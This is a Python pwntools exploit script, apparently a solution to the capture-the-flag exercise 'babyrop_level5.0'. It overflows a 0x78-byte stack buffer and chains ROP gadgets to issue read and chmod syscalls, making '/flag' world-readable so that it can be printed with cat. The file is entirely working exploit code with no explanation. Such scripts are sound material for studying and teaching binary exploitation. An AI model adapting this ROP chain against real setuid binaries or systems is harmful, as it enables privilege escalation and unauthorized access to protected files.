from pwn import *


challenge_name = '/challenge/babyrop_level5.0'
buf_size = 0x78 #offset from ra


elf = ELF(challenge_name) 
rop = ROP(elf)             

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]  
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]  
pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]  
pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]  
syscall = rop.find_gadget(['syscall', 'ret'])[0]  

print("pop rdi; ret  :", hex(pop_rdi))
print("pop rsi; ret  :", hex(pop_rsi))
print("pop rdx; ret  :", hex(pop_rdx))
print("pop rax; ret  :", hex(pop_rax))
print("syscall; ret  :", hex(syscall))

p = process([challenge_name])

bss = elf.bss() + 0x100  
payload = buf_size * b'A'

payload += p64(pop_rdi)
payload += p64(0)      
payload += p64(pop_rsi)
payload += p64(bss)    
payload += p64(pop_rdx)
payload += p64(8)     
payload += p64(pop_rax)
payload += p64(0)      
payload += p64(syscall)

payload += p64(pop_rdi)
payload += p64(bss)    
payload += p64(pop_rsi)
payload += p64(0o777)   
payload += p64(pop_rax)
payload += p64(90)     
payload += p64(syscall)

p.send(payload)
p.send(b'/flag\x00') 

answer = p.clean()
print(answer.decode(errors='ignore'))

p = process(["/usr/bin/cat", '/flag'])
answer = p.clean()
print(answer.decode(errors='ignore'))